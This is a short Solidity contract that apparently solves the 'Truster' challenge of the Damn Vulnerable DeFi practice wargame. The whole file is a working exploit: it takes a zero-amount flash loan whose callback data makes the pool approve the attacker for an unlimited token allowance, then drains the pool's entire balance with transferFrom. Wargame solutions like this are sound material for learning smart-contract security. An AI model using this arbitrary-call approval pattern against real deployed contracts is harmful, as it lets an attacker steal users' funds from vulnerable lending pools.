// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import { TrusterLenderPool } from "../../03_truster/TrusterLenderPool.sol";
import { DamnValuableToken } from "../../DamnValuableToken.sol";

contract AttackTruster {
    function attack(TrusterLenderPool pool) external {
        DamnValuableToken token = DamnValuableToken(pool.TOKEN());

        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), type(uint256).max);
        pool.flashLoan(0, address(this), address(token), data);
        token.transferFrom(address(pool), msg.sender, token.balanceOf(address(pool)));
    }
}
